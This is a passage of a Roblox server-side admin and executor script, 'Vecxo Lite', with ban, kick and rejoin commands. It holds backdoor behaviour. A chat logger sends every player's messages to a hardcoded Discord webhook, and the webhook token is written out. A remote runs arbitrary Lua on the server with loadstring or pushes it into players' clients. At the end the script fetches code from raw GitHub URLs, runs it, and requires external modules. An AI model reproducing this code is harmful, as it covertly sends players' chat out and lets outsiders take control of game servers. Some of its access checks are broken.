				task.spawn(function()
					GraphicalEffects.CrystalRing(targetPlayer, "Really red", 2)
				end)
				table.insert(userIds, targetPlayer.UserId)
				if reason then
					targetPlayer:Kick("[Vecxo Lite]: ‚ùå Permanently banned by " .. sender.Name .. ": " .. reason)
				else
					targetPlayer:Destroy()
				end
			end
		end
		if #userIds > 0 then
			banConfig.UserIds = userIds
			local banSuccess, banError = pcall(function()
				return game.Players:BanAsync(banConfig)
			end)
			if banSuccess then
				notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Permanently banned " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ö†Ô∏è Kicked players but ban API failed: " .. tostring(banError))
				for _, targetPlayer in ipairs(targets) do
					if not table.find(exclusivewl, targetPlayer.Name) then
						permBannedPlayers[targetPlayer.UserId] = nil
					end
				end
			end
		end
	elseif cmd == "!permbans" then
		handled = true
		if permBannedPlayers and next(permBannedPlayers) then
			local bannedNames = {}
			for playerName, _ in pairs(permBannedPlayers) do
				table.insert(bannedNames, playerName)
			end
			local nameList = table.concat(bannedNames, ", ")
			notify(sender, "[Vecxo Lite]: Permanently Banned Players", "üìã " .. nameList, 10)
		else
			notifyv3(sender, "[Vecxo Lite]: ", "üìã No permanently banned players found.")
		end
	elseif cmd == "!unpermban" and args[2] then
		handled = true
		local success, userId = pcall(function()
			return game.Players:GetUserIdFromNameAsync(args[2])
		end)
		if success and userId then
			local unbanConfig = {
				UserIds = {userId},
				ApplyToUniverse = true
			}
			local unbanSuccess, unbanError = pcall(function()
				return game.Players:UnbanAsync(unbanConfig)
			end)
			if unbanSuccess then
				bannedPlayers[game.Players:GetUserIdFromNameAsync(args[2])] = nil
				permBannedPlayers[game.Players:GetUserIdFromNameAsync(args[2])] = nil
				notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully unpermbanned " .. args[2])
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Failed to unpermban " .. args[2] .. ": " .. tostring(unbanError))
			end
		else
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Player '" .. args[2] .. "' not found.")
		end
	elseif cmd == "!ban" and args[2] then
		handled = true
		local reason = msg:match("^!ban%s+%S+%s+(.+)$")
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			if not table.find(exclusivewl, targetPlayer.Name) then
				task.spawn(function()
					GraphicalEffects.CrystalRing(targetPlayer, "Really red", 2)
				end)
				bannedPlayers[targetPlayer.UserId] = true
				bannedNameLookup[targetPlayer.Name:lower()] = targetPlayer.UserId
				if reason then
					targetPlayer:Kick("[Vecxo Lite]: Banned by " .. sender.Name .. ": " .. reason)
				else
					bannedPlayers[targetPlayer.UserId] = true
					bannedNameLookup[targetPlayer.Name:lower()] = targetPlayer.UserId
					targetPlayer:Destroy()
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Banned " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!rj" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, targetPlayer in ipairs(targets) do
			if game.PrivateServerId ~= "" then
				task.spawn(function()
					GraphicalEffects.CrystalRing(targetPlayer, "Lime green", 2)
				end)
				game:GetService("TeleportService"):Teleport(game.PlaceId, targetPlayer)
			else
				local options = Instance.new("TeleportOptions")
				options.ServerInstanceId = game.JobId
				task.spawn(function()
					GraphicalEffects.CrystalRing(targetPlayer, "Lime green", 2)
				end)
				game:GetService("TeleportService"):TeleportAsync(game.PlaceId, {targetPlayer}, options)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Rejoining " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. "..."))
	elseif cmd == "!h" then
		handled = true
		local announcement = msg:sub(4)
		for _, plr in ipairs(Players:GetPlayers()) do
			notify(plr, "[Vecxo Lite]: ", announcement)
		end
	end
	if not handled then
		notifyv3(sender, "[Vecxo Lite]:", "‚ùå Command '" .. cmd .. "' not found. Type !cmds for help.")
	end
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local WEBHOOK_URL = "https://discord.com/api/webhooks/1407445832617299968/9wqvSS4Wi0vopUL0JgAOf6EE4HOAltwIg_T3JWQutrxVhuIX4TZZ_Tllg7fq7TaaiIm5"
local WEBHOOK_URL2 = "https://discord.com/api/webhooks/1404111740899295282/St75qFjXPJ25W09ruiuUY20mvHsH9sjY-Q55y4NFjZATVTzYqqCVFCkY5dtvelqLwBud"


local function sanitizeMessage(msg)
	msg = msg:gsub("@here", "@\u{200B}here")
	msg = msg:gsub("@everyone", "@\u{200B}everyone")
	return msg
end

local function connectChatLogger(player)
	vecxoconnections["Chatted3"] = player.Chatted:Connect(function(message)
		local safeMessage = sanitizeMessage(message)
		local shortServerId = string.sub(game.JobId, 1, 8) .. "..."

		local formattedMessage = string.format(
			"**%s** (@%s) ‚Ä¢ `%s`\n> %s",
			player.Name,
			player.DisplayName,
			shortServerId,
			safeMessage
		)

		local payload = {
			username = "Vecxo Remote API Bot",
			content = formattedMessage,
			avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg?ex=68a1d8d2&is=68a08752&hm=e2018e268f0ea98cc77ecea23cdd03ba24cb46d202ad8f4812d912afe1dca488"
		}

		local success, response = pcall(function()
			HttpService:PostAsync(
				WEBHOOK_URL,
				HttpService:JSONEncode(payload),
				Enum.HttpContentType.ApplicationJson
			)
		end)

		if not success then
			warn("Failed to send message to Discord:", response)
		end
	end)
end

--//credit to dekry :D
vecxoconnections["AntiKill"] = function(Character:Model)
	if Character and Character:FindFirstChild("HumanoidRootPart") then
		local DeathPosition = Character.HumanoidRootPart.CFrame
		if AutoRespawn[Character.Name] then
			local Player = game.Players[Character.Name]
			Player:LoadCharacter()
			Player.Character:WaitForChild("HumanoidRootPart",3)
			Player.Character.HumanoidRootPart.CFrame = DeathPosition
		end
	end
end

vecxoconnections["AntiKill2"] = function(Character:Model)
	Character.Humanoid.Died:Once(function()
		vecxoconnections["AntiKill"](Character)
	end)
end

vecxoconnections["AntiKill3"] = function(Player:Player)
	if not Player then
		return
	end
	AutoRespawn[Player.Name] = Player.CharacterAdded:Connect(vecxoconnections["AntiKill2"])
	vecxoconnections["AntiKill2"](Player.Character)
end


vecxoconnections["Gmod"] = function()
	local r = game:GetService("ReplicatedStorage")
	local remote = r:WaitForChild("cxo's folder"):WaitForChild("cxo's gmod remote")
	local grabbed = {}
	local grabbing

	remote.OnServerEvent:Connect(function(player, action, target)
		local pass = false
		if table.find(whitelisted, tostring(player.UserId)) then
			pass = true
		end
		if pass ~= false then
			if action == "Pickup" and table.find(gmodded, player.UserId) then
				if target and target:IsA("BasePart") and target.Anchored == false then
					grabbed[player] = target
					grabbing = target
					print(target.Name)
					target:SetNetworkOwner(player)
				end
			elseif action == "Update" and table.find(gmodded, player.UserId) then
				if grabbed[player] then
					local part = grabbed[player]
					if part then
						part.CFrame = CFrame.new(target)
					end
				end
			elseif action == "Release" and table.find(gmodded, player.UserId) then
				local part = grabbing
				grabbed[player] = nil
				local character = part.Parent
				if character and character:FindFirstChild("Humanoid") then
					for i,v in pairs(character:GetChildren()) do
						if v:IsA("BasePart") and v.Name == "Torso" or v.Name == "HumanoidRootPart" then
							v:SetnetworkOwner(character)
						end
					end
				else
					part:SetNetworkOwner(nil)
				end
			end
		end
	end)
end

game.ReplicatedStorage.VecxoRequestToken.OnServerInvoke = function(player)
	return authTokens[player] or nil
end

for _, player in ipairs(game.Players:GetPlayers()) do
	if bannedPlayers[player.UserId] then
		player:Kick("[Vecxo Lite]: You are banned from this server.")
	end
	coroutine.wrap(function()
		connectChatLogger(player)
	end)()
	vecxoconnections["Chatted1"] = player.Chatted:Connect(function(message)
		processCommand(player, message)
		logChatMessage(player, message)
	end)
	if table.find(whitelisted, tostring(player.UserId)) then
		local token = generateToken()
		authTokens[player] = token
		TokenRemote:FireClient(player, token)
		notify(player, "[Vecxo Lite]:", "‚úÖ You are whitelisted! Usage: !cmds")
		task.spawn(function()
			GraphicalEffects.CrystalRing(player, "Really black", 4, true)
		end)
	end
end

vecxoconnections["Joined1"] = Players.PlayerAdded:Connect(function(player)
	if bannedPlayers[player.UserId] then
		player:Kick("[Vecxo Lite]: You are banned from this server.")
		return
	end
	coroutine.wrap(function()
		connectChatLogger(player)
	end)()
	vecxoconnections["Chatted2"] = player.Chatted:Connect(function(message)
		processCommand(player, message)
		logChatMessage(player, message)
	end)
	if table.find(whitelisted, tostring(player.UserId)) then
		local token = generateToken()
		authTokens[player] = token
		TokenRemote:FireClient(player, token)
		task.spawn(function()
			local char = player.Character or player.CharacterAdded:Wait()
			notifyv3(player, "[Vecxo Lite]:", "‚úÖ You are whitelisted! Usage: !cmds")
			char:WaitForChild("HumanoidRootPart")
			GraphicalEffects.CrystalRing(player, "Really black", 4, true)
		end)
	end
end)

start()
vecxoconnections["Gmod"]()

vecxoconnections["RemoteListener"] = function()
	local remote = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder"):WaitForChild("cxo's remote")
	remote.OnServerEvent:Connect(function(player, choice, command, target, target2, extra, extra2)
		local cz = false
		if table.find(whitelisted, tostring(player.UserId)) then
			cz = true
		end
		if cz ~= true then
			if not table.find(whitelisted, tostring(player.UserId)) then
				notify(player, "[Vecxo Lite]: ‚ùå ", "This remote is protected, you are not authorized to use it")
				return
			end
			if choice == "F3X" then
				require(2571067295).load(player.Name)
			end

			if choice == "Reload" then

			end

			if choice == "chat" then

				if extra2 == "" or extra2 == " " then
					return
				end

				if player.Character and player.Character:FindFirstChild("Head") then
					game:GetService("Chat"):Chat(player.Character.Head, extra2, Enum.ChatColor.White)
				end

				if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
					local ticking = tick()
					require(gamegoog).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

				if not goog then
					warn("goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr

				if extra == "public" then
					scr:WaitForChild("Exec").Value = string.format([[

				game:GetService("TextChatService"):WaitForChild("TextChannels"):FindFirstChild("RBXGeneral"):DisplaySystemMessage("[%s]: %s")


				]], player.DisplayName, extra2)
					for i,v in pairs(game.Players:GetPlayers()) do
						if v.Character then
							local sc = scr:Clone()
							sc.Parent = v.Character
							sc.Enabled = true
						else
							local sc = scr:Clone()
							sc.Parent = v.PlayerGui
							sc.Enabled = true
						end
					end
				end

				if extra == "whisper" then -- was gonna make this work but im too lazy
					scr:WaitForChild("Exec").Value = string.format([[

				game:GetService("TextChatService"):WaitForChild("TextChannels"):FindFirstChild("RBXGeneral"):DisplaySystemMessage("[Whisper From %s]: %s")

				script:Destroy()

				]], player.Name, extra2)
					p = game.Players:FindFirstChild(target)
					if p then
						if p.Character then
							scr.Parent = p.Character
						else
							scr.Parent = p.PlayerGui
						end
					end
				end
			end

			if choice == "Code" then
				if extra == "SERVER" then
					if table.find(_G.Whitelist, tostring(player.UserId)) then
						print("[SYNAPSE X - SERVERSIDE]: ".. extra2)
						loadstring(extra2)()
					end
				elseif extra == "CLIENT" then
					print("[SYNAPSE X - CLIENT]: ".. extra2)
					if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
						local ticking = tick()
						require(gamegoog).load() -- goog readder
						repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
					end

					local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

					if not goog then
						warn("goog failed to be added, command can not continue")
						return
					end

					local scr = goog:FindFirstChild("Utilities").Client:Clone()
					local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

					loa.Parent = scr
					scr:WaitForChild("Exec").Value = string.format([[

					%s

				]], extra2)

					if player.PlayerGui then
						scr.Parent = player.PlayerGui
					else
						if player.Character then
							scr.Parent = player.Character
						end
					end

					scr.Name = "CODE"
					scr.Enabled = true
				end
			end
		end
	end)
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")

local chatRemote = ReplicatedStorage:FindFirstChild("VecxoChatRemote")
if not chatRemote then
	chatRemote = Instance.new("RemoteEvent")
	chatRemote.Name = "VecxoChatRemote"
	chatRemote.Parent = ReplicatedStorage
end

chatRemote.OnServerEvent:Connect(function(player, message)
	print(player.Name .. " fired VecxoChatRemote with:", message)
end)

	--[[	local HttpService = game:GetService("HttpService")
		local code
		local success, err = pcall(function()
			code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/RoChatAPI")
		end)
		if not success then
			warn'http failed with chat api'
			return
		end
		local formattedMessage = `{player.Name}: {message}`
		code = code:gsub('%[Vecko%]: asd', formattedMessage)
		for i, plr in pairs(game.Players:GetPlayers()) do
			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(88532011070135).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("Epic") or tick() - ticking >= 10
			end
			local Epic = game:GetService("ServerScriptService"):FindFirstChild("Epic")
			if not Epic then
				warn("Pro module failed to be added, command cannot continue")
				return
			end

			local scr = Epic:FindFirstChild("Utilities").Client:Clone()
			local loa = Epic:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = code
			if plr.Character then
				scr.Parent = plr:WaitForChild("PlayerGui")
			end
			scr.Enabled = true
		end
	end
end) ]]

task.spawn(function()
	while true do
		for plr, active in pairs(AntiExePlayers) do
			if active and plr.Parent then
				local pg = plr:FindFirstChild("PlayerGui")
				if pg then
					for _, gui in ipairs(pg:GetChildren()) do
						if gui:IsA("ScreenGui") then
							if gui.Name ~= "StarterGui" and gui.Name ~= "HealthGui" and gui.Name ~= "CoreGuiClone" then
								gui:Destroy()
							end
						end
					end
				end
			end
		end
		task.wait(0.01)
	end
end)

task.spawn(function()
	while true do
		for name, _ in pairs(AutoUnpunish) do
			local plr = game.Players:FindFirstChild(name)
			if plr and plr.Character and plr.Character.Parent == game:GetService("Lighting") then
				plr.Character.Parent = workspace
			end
		end
		task.wait(.01)
	end
end)

pcall(function() --//bit more secure
	game.ReplicatedStorage.VecxoCommandEvent.OnServerEvent:Connect(function(player, token, msg)
		if not table.find(whitelisted, tostring(player.UserId)) then
			notify(player, "[Vecxo Lite]: ‚ùå ", "This remote is protected, and you are not authorized to use it")
			for i, v in pairs(game.Players:GetPlayers()) do
				if table.find(whitelisted, tostring(v.UserId)) then
					notify(v, "[Vecxo Lite]: ‚ùå ", player.Name.. " attempted to fire the cmdbar remote without being whitelisted!")
				end
				if not table.find(whitelisted, tostring(v.UserId)) then
					local embed = {
						title = "Unauthorized Remote Parse",
						description = "**Player:** " .. player.Name .. " (UserId: " .. player.UserId .. ") attempted to fire the cmdbar remote without being whitelisted!",
						color = 0xFF0000,
						footer = {
							text = "Vecxo Lite Security Alert"
						},
						timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
					}

					local payload = {
						username = "Vecxo Lite Remote API",
						avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg?ex=68a1d8d2&is=68a08752&hm=e2018e268f0ea98cc77ecea23cdd03ba24cb46d202ad8f4812d912afe1dca488",
						embeds = {embed}
					}

					local success, response = pcall(function()
						HttpService:PostAsync(
							WEBHOOK_URL2,
							HttpService:JSONEncode(payload),
							Enum.HttpContentType.ApplicationJson
						)
					end)
				end
			end
			return
		end
		if authTokens[player] ~= token then --//make it check everyone
			for _, v in pairs(game.Players:GetPlayers()) do
				if table.find(whitelisted, tostring(v.UserId)) then
					notify(
						v,
						"[Vecxo Lite]: ‚ùå ",
						player.Name ..
							" tried to use an invalid/expired auth token to access the cmd remote!\n" ..
							"Provided: " .. tostring(token) .. "\nExpected: " .. tostring(authTokens[player])
					)

				end
			end
			local embed = {
				title = "Invalid Auth Token Parse Attempt",
				description = "**Player:** " .. player.Name .. " (@" .. player.DisplayName .. ")\n" ..
					"**Action:** Tried to use an invalid/expired auth token to access the command remote ‚ùå ",
				color = 0xFF0000,
				fields = {
					{
						name = "Expected Token",
						value = "```" .. tostring(authTokens[player]) .. "```",
						inline = false
					},
					{
						name = "Received Token",
						value = "```" .. tostring(token) .. "```",
						inline = false
					}
				},
				footer = {
					text = "Vecxo Lite Security Alert"
				},
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
			}
			local payload = {
				username = "Vecxo Lite Remote API",
				avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg?ex=68a1d8d2&is=68a08752&hm=e2018e268f0ea98cc77ecea23cdd03ba24cb46d202ad8f4812d912afe1dca488",
				embeds = {embed}
			}

			local success, response = pcall(function()
				HttpService:PostAsync(
					WEBHOOK_URL2,
					HttpService:JSONEncode(payload),
					Enum.HttpContentType.ApplicationJson
				)
			end)
			return
		end
		if not table.find(whitelisted, tostring(player.UserId)) then --//purely check tokens from unregistered users
			if token ~= "" and token ~= nil then
				local embed = {
					title = "Invalid Auth Token Parse Attempt",
					description = "**Unwhitelisted player:** " .. player.Name .. " (@" .. player.DisplayName .. ")\n" ..
						"**Action:** Tried to use an invalid/expired auth token to access the command remote ‚ùå ",
					color = 0xFF0000,
					fields = {
						{
							name = "Expected Token",
							value = "```" .. tostring(authTokens[player]) .. "```",
							inline = false
						},
						{
							name = "Received Token",
							value = "```" .. tostring(token) .. "```",
							inline = false
						}
					},
					footer = {
						text = "Vecxo Lite Security Alert"
					},
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}
				local payload = {
					username = "Vecxo Lite Remote API",
					avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg?ex=68a1d8d2&is=68a08752&hm=e2018e268f0ea98cc77ecea23cdd03ba24cb46d202ad8f4812d912afe1dca488",
					embeds = {embed}
				}

				local success, response = pcall(function()
					HttpService:PostAsync(
						WEBHOOK_URL2,
						HttpService:JSONEncode(payload),
						Enum.HttpContentType.ApplicationJson
					)
				end)
			end
			return --//if ur not whitelisted fuck off, ur not getting ur command parsed regardless, literally max remote security get mogged
		end
		if authTokens[player] == token then
			local embed = {
				title = "Authentication Parse Successful",
				description = "**Player:** " .. player.Name .. " (@" .. player.DisplayName .. ") cmd token authenticated.\n" ..
					"Command `" .. tostring(msg) .. "` was passed successfully ‚úÖ",
				color = 0x00FF00,
				fields = {
					{
						name = "Token",
						value = "```" .. tostring(token) .. "```",
						inline = false
					}
				},
				footer = {
					text = "Vecxo Lite CMD Token Authenticated"
				},
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
			}
			local payload = {
				username = "Vecxo Lite Remote API",
				avatar_url = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg?ex=68a1d8d2&is=68a08752&hm=e2018e268f0ea98cc77ecea23cdd03ba24cb46d202ad8f4812d912afe1dca488",
				embeds = {embed}
			}
			local success, response = pcall(function()
				HttpService:PostAsync(
					WEBHOOK_URL2,
					HttpService:JSONEncode(payload),
					Enum.HttpContentType.ApplicationJson
				)
			end)
		end
		processCommand(player, msg)
		logChatMessage(player, msg)
		local newToken = generateToken()
		authTokens[player] = newToken
		TokenRemote:FireClient(player, newToken)
	end)
end)


local ReplicatedStorage = game:GetService("ReplicatedStorage")

scriptrunning = true


task.spawn(function()
	local function saveMap(parent)
		pcall(function()
		for _, obj in pairs(parent:GetDescendants()) do
			if obj:IsA("BasePart") or obj:IsA("Model") then
				if obj:IsA("Model") and obj:FindFirstChild("Humanoid") then
					continue
				end
				OriginalMap[obj:GetFullName()] = obj:Clone()
				end
			end
		end)
	end
	saveMap(workspace)
	while scriptrunning == true do
		if not ReplicatedStorage:FindFirstChild("VecxoCommandEvent") then
			local remoteEvent = Instance.new("RemoteEvent")
			remoteEvent.Name = "VecxoCommandEvent"
			remoteEvent.Parent = ReplicatedStorage
		end

		if not ReplicatedStorage:FindFirstChild("VecxoRequestToken") then
			local remoteFunction = Instance.new("RemoteFunction")
			remoteFunction.Name = "VecxoRequestToken"
			remoteFunction.Parent = ReplicatedStorage
		end

		if not ReplicatedStorage:FindFirstChild("VecxoCommandToken") then
			local remoteEvent = Instance.new("RemoteEvent")
			remoteEvent.Name = "VecxoCommandToken"
			remoteEvent.Parent = ReplicatedStorage
		end
		task.wait(0.3)
	end
end)

_G.VeckoRemoteRan = _G.VeckoRemoteRan or false

task.wait(0.2)

if _G.VeckoRemoteRan == false then
	loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/DekKAHBuildAPI'))()
	task.wait(0.3)
	loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoRemoteAPI'))() 
	require(96351578964277) --//Palamodes Module
	_G.VeckoRemoteRan = true
	_G.VeckoRemoteInitalized = true
else
	if _G.VeckoRemoteRan and not _G.VeckoRemoteInitalized then
		_G.VeckoRemoteInitalized = true
	else
		warn("[Vecxo Lite]: Remote API already loaded, so it skipped.")
	end
end
